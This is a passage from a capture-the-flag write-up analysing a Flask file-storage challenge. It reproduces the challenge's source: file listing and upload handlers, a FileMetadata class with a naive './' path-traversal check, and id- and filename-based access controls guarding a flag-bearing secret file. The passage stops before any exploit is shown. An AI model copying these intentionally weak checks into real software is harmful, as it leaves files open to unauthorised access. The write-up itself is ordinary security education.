</span><span class="code-line line-number" line="32">            <span class="token string">"filename"</span><span class="token punctuation">:</span> <span class="token string">"secretrecipe.txt"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="33">            <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"Super secret recipe"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="34">            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"ea41c85c-3db0-4ded-aff1-a93994f64d81"</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="35">        <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="36">        <span class="token string">"content"</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="37">    <span class="token punctuation">}</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="38"><span class="token punctuation">]</span>
</span></code><div onclick="copied(this)" data-code="files = [
    {
        &#x22;metadata&#x22;: {
            &#x22;author&#x22;: &#x22;Slurm Mckenzie&#x22;,
            &#x22;filename&#x22;: &#x22;whytodrinkslurm.txt&#x22;,
            &#x22;description&#x22;: &#x22;Discover why to drink our awesome slurm&#x22;,
            &#x22;id&#x22;: &#x22;e7bfd133-9fe0-4b9b-94bc-2857f92bd13b&#x22;,
        },
        &#x22;content&#x22;: &#x22;The most addictive drink ever!&#x22;,
    },
    {
        &#x22;metadata&#x22;: {
            &#x22;author&#x22;: &#x22;Slurm Mckenzie&#x22;,
            &#x22;filename&#x22;: &#x22;aboutingredients.txt&#x22;,
            &#x22;description&#x22;: &#x22;Some good news about our ingredients&#x22;,
            &#x22;id&#x22;: &#x22;1e8f1948-4f3b-4a33-8be6-e6938efdfabc&#x22;,
        },
        &#x22;content&#x22;: &#x22;Bio ingredients, all natural stuffs.&#x22;,
    },
    {
        &#x22;metadata&#x22;: {
            &#x22;author&#x22;: &#x22;Slurm Mckenzie&#x22;,
            &#x22;filename&#x22;: &#x22;healthydrink.txt&#x22;,
            &#x22;description&#x22;: &#x22;Our drink is healty&#x22;,
            &#x22;id&#x22;: &#x22;50fca9e8-2619-43b8-b84b-a555bf48e2c5&#x22;,
        },
        &#x22;content&#x22;: &#x22;Refill your energy and take care about your weight and your health with slurm!&#x22;,
    },
    {
        &#x22;metadata&#x22;: {
            &#x22;author&#x22;: &#x22;Slurm Queen&#x22;,
            &#x22;filename&#x22;: &#x22;secretrecipe.txt&#x22;,
            &#x22;description&#x22;: &#x22;Super secret recipe&#x22;,
            &#x22;id&#x22;: &#x22;ea41c85c-3db0-4ded-aff1-a93994f64d81&#x22;,
        },
        &#x22;content&#x22;: os.getenv(&#x22;FLAG&#x22;),
    },
]
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>We also see that making a GET request to <code>/files</code> only returns the files' metadata and if we try to get the content of a file, it first checks whether the id is the <code>secretrecipe.txt</code> file id, in which case it returns 403, otherwise it queries the database searching for the file id we asked for and if it exists the app creates a strange <code>FileMetadata</code> object with the query's result fields.</p>
    <p>We can also see that if <code>secretrecipe.txt</code> is in our result's filename field, and if it is, it also restricts us from viewing the file's contents, keep this in mind for later.</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="3">    <span class="token keyword">return</span> <span class="token punctuation">[</span>f<span class="token punctuation">[</span><span class="token string">"metadata"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> f <span class="token keyword">in</span> files<span class="token punctuation">]</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5">
</span><span class="code-line line-number" line="6"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/files/&#x3C;id>"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="7"><span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="8">    <span class="token keyword">if</span> <span class="token builtin">id</span> <span class="token operator">==</span> <span class="token string">"ea41c85c-3db0-4ded-aff1-a93994f64d81"</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="9">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">403</span>
</span><span class="code-line line-number" line="10">    res <span class="token operator">=</span> metadata<span class="token punctuation">.</span>find_one<span class="token punctuation">(</span><span class="token punctuation">{</span>
</span><span class="code-line line-number" line="11">        <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"$eq"</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="12">    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="13">    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="14">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">404</span>
</span><span class="code-line line-number" line="15">    m <span class="token operator">=</span> FileMetadata<span class="token punctuation">(</span>
</span><span class="code-line line-number" line="16">        res<span class="token punctuation">[</span><span class="token string">"author"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="17">        res<span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="18">        res<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="19">        <span class="token builtin">id</span><span class="token operator">=</span>res<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="20">    <span class="token punctuation">)</span>
</span><span class="code-line line-number" line="21">    <span class="token keyword">if</span> files<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"metadata"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> res<span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="22">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">403</span>
</span><span class="code-line line-number" line="23">    <span class="token keyword">return</span> m<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"offset"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="@app.get(&#x22;/files&#x22;)
def get_files():
    return [f[&#x22;metadata&#x22;] for f in files]


@app.get(&#x22;/files/<id>&#x22;)
def get_file(id):
    if id == &#x22;ea41c85c-3db0-4ded-aff1-a93994f64d81&#x22;:
        return &#x22;&#x22;, 403
    res = metadata.find_one({
        &#x22;id&#x22;: {&#x22;$eq&#x22;: id}
    })
    if res is None:
        return &#x22;&#x22;, 404
    m = FileMetadata(
        res[&#x22;author&#x22;],
        res[&#x22;filename&#x22;],
        res[&#x22;description&#x22;],
        id=res[&#x22;id&#x22;],
    )
    if files[-1][&#x22;metadata&#x22;][&#x22;filename&#x22;] in res[&#x22;filename&#x22;]:
        return &#x22;&#x22;, 403
    return m.read(int(request.args.get(&#x22;offset&#x22;, 0)))
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Let's see what this <code>FileMetadata</code> class is:</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">class</span> <span class="token class-name">FileMetadata</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="2">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>
</span><span class="code-line line-number" line="3">            self<span class="token punctuation">,</span>
</span><span class="code-line line-number" line="4">            author<span class="token punctuation">,</span>
</span><span class="code-line line-number" line="5">            filename<span class="token punctuation">,</span>
</span><span class="code-line line-number" line="6">            description<span class="token punctuation">,</span>
</span><span class="code-line line-number" line="7">            <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="8">    <span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="9">        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span> <span class="token keyword">or</span> \
</span><span class="code-line line-number" line="10">           <span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span> <span class="token keyword">or</span> \
</span><span class="code-line line-number" line="11">           <span class="token builtin">len</span><span class="token punctuation">(</span>description<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">150</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="12">            <span class="token keyword">raise</span> StringTooLongException<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="13">        self<span class="token punctuation">.</span>creation_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span>tz<span class="token operator">=</span>timezone<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="14">
</span><span class="code-line line-number" line="15">        self<span class="token punctuation">.</span>author <span class="token operator">=</span> author
</span><span class="code-line line-number" line="16">        self<span class="token punctuation">.</span>filename <span class="token operator">=</span> filename
</span><span class="code-line line-number" line="17">        self<span class="token punctuation">.</span>init <span class="token operator">=</span> <span class="token builtin">id</span> <span class="token keyword">in</span> forbidden_ids
</span><span class="code-line line-number" line="18">        basedir <span class="token operator">=</span> <span class="token string">"/company"</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>init <span class="token keyword">else</span> <span class="token string">"/tmp"</span>
</span><span class="code-line line-number" line="19">        self<span class="token punctuation">.</span>path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>basedir<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span>
</span><span class="code-line line-number" line="20">        self<span class="token punctuation">.</span>description <span class="token operator">=</span> description
</span><span class="code-line line-number" line="21">        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>UUID<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> version<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">id</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="22">
</span><span class="code-line line-number" line="23">    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> collection<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="24">        <span class="token keyword">if</span> self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> forbidden_ids <span class="token keyword">and</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>init<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="25">            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Use of forbidden id"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="26">
</span><span class="code-line line-number" line="27">        collection<span class="token punctuation">.</span>insert_one<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="28">
</span><span class="code-line line-number" line="29">        <span class="token keyword">if</span> <span class="token string">"./"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>path<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="30">            <span class="token keyword">raise</span> PathTraversalAttemptDetectedException<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="31">        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">200</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="32">            <span class="token keyword">raise</span> FileTooBigException<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="33">        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="34">            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="35">
</span><span class="code-line line-number" line="36">    <span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="37">        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="38">            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="39">            <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="class FileMetadata:
    def __init__(
            self,
            author,
            filename,
            description,
            id = None,
    ):
        if len(author) > 50 or \
           len(filename) > 50 or \
           len(description) > 150:
            raise StringTooLongException()
        self.creation_time = datetime.now(tz=timezone.utc)

        self.author = author
        self.filename = filename
        self.init = id in forbidden_ids
        basedir = &#x22;/company&#x22; if self.init else &#x22;/tmp&#x22;
        self.path = f&#x22;{basedir}/{filename}&#x22;
        self.description = description
        self.id = str(UUID(id, version=4)) if id is not None else str(uuid4())

    def write(self, collection, content):
        if self.id in forbidden_ids and not self.init:
            raise ValueError(&#x22;Use of forbidden id&#x22;)

        collection.insert_one(vars(self))

        if &#x22;./&#x22; in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, &#x22;w&#x22;) as f:
            f.write(content)

    def read(self, offset):
        with open(self.path) as f:
            f.seek(offset)
            return f.read()
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Ok so we can see it's a wrapper class to write and read files. It gets initialized with an author, a filename, a description and an id if one is supplied. Then it checks if the supplied id is in the forbidden ids, which are the files created at the start of the app (including <code>secretrecipe.txt</code>), and if it is it sets the <code>self.init</code>, which sets the <code>basedir</code> to be <code>/company</code> rather than <code>/tmp</code>. So this tells us all of the default files are located at <code>/company</code> while all the files we upload are in <code>/tmp</code>.</p>
    <p>Looking at the write function we see that if either the FileMetadata object was created initially with a forbidden id or it has a forbidden id it will throw an error, so we cannot overwrite the default files. After this check the app then adds our FileMetadata object to the database and then checks if the <code>self.filename</code> field contains <code>./</code> in which case it throws an error, same as if the <code>content</code> parameter is longer than 200. After all these checks it finally writes our content in the file at <code>self.path</code>.</p>
    <p>The read function opens the file at <code>self.path</code> and then reads its contents beginning at a certain offset, which is interesting.</p>
    <p>Let's see how the application handles file uploads:</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">def</span> <span class="token function">post_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="3">    body <span class="token operator">=</span> request<span class="token punctuation">.</span>json
</span><span class="code-line line-number" line="4">    <span class="token keyword">try</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="5">        parsed_body <span class="token operator">=</span> parse_file<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="6">    <span class="token keyword">except</span> <span class="token punctuation">(</span>KeyError<span class="token punctuation">,</span> ValueError<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="7">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">422</span>
</span><span class="code-line line-number" line="8">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</span></code><div onclick="copied(this)" data-code="@app.post(&#x22;/files&#x22;)
def post_file():
    body = request.json
    try:
        parsed_body = parse_file(body)
    except (KeyError, ValueError):
        return &#x22;&#x22;, 422
    ...
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Ok so it takes our request.json and tries to parse it in the <code>parse_file</code> method</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">def</span> <span class="token function">parse_file</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="2">    <span class="token keyword">import</span> re<span class="token punctuation">,</span> string
</span><span class="code-line line-number" line="3">    CONTENT_CHECK <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[^ </span><span class="token interpolation"><span class="token punctuation">{</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">}</span></span><span class="token string">]"</span></span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5">    <span class="token keyword">if</span> CONTENT_CHECK<span class="token punctuation">.</span>search<span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="6">        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="7">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">200</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="8">        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="9">
</span><span class="code-line line-number" line="10">    <span class="token keyword">return</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="11">        <span class="token string">"metadata"</span><span class="token punctuation">:</span> FileMetadata<span class="token punctuation">(</span>
</span><span class="code-line line-number" line="12">            body<span class="token punctuation">[</span><span class="token string">"author"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="13">            body<span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="14">            body<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="15">            <span class="token builtin">id</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="16">        <span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="17">        <span class="token string">"content"</span><span class="token punctuation">:</span> body<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="18">    <span class="token punctuation">}</span>
</span></code><div onclick="copied(this)" data-code="def parse_file(body, id=None):
    import re, string
    CONTENT_CHECK = re.compile(f&#x22;[^ {string.ascii_letters}]&#x22;)

    if CONTENT_CHECK.search(body[&#x22;content&#x22;]):
        raise ValueError()
    if len(body[&#x22;content&#x22;]) > 200:
        raise ValueError()

    return {
        &#x22;metadata&#x22;: FileMetadata(
            body[&#x22;author&#x22;],
            body[&#x22;filename&#x22;],
            body[&#x22;description&#x22;],
            id,
        ),
        &#x22;content&#x22;: body[&#x22;content&#x22;]
    }
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>which returns a FileMetadata object initialized with our request's author,filename and description, an id which is None if not provided and <code>body["content"]</code>. There are a couple of checks that make sure the file's content only contain letters and doesn't contain more than 200 characters, so no weird shenanigans here.</p>
    <p>Coming back to the upload functionality, after parsing our request the app uses the FileMetadata write method on the object created by parse_file and then redirects us to the location of the newly created file.</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">def</span> <span class="token function">post_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="3">    body <span class="token operator">=</span> request<span class="token punctuation">.</span>json
</span><span class="code-line line-number" line="4">    <span class="token keyword">try</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="5">        parsed_body <span class="token operator">=</span> parse_file<span class="token punctuation">(</span>body<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="6">    <span class="token keyword">except</span> <span class="token punctuation">(</span>KeyError<span class="token punctuation">,</span> ValueError<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="7">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">422</span>
</span><span class="code-line line-number" line="8">    m <span class="token operator">=</span> parsed_body<span class="token punctuation">[</span><span class="token string">"metadata"</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="9">    content <span class="token operator">=</span> parsed_body<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="10">    m<span class="token punctuation">.</span>write<span class="token punctuation">(</span>metadata<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="11">    r <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="12">    r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Location"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/api/v1/files/</span><span class="token interpolation"><span class="token punctuation">{</span>m<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
</span><span class="code-line line-number" line="13">    <span class="token keyword">return</span> r
</span></code><div onclick="copied(this)" data-code="@app.post(&#x22;/files&#x22;)
def post_file():
    body = request.json
    try:
        parsed_body = parse_file(body)
    except (KeyError, ValueError):
        return &#x22;&#x22;, 422
    m = parsed_body[&#x22;metadata&#x22;]
    content = parsed_body[&#x22;content&#x22;]
    m.write(metadata, content)
    r = make_response(&#x22;&#x22;, 201)
    r.headers[&#x22;Location&#x22;] = f&#x22;/api/v1/files/{m.id}&#x22;
    return r
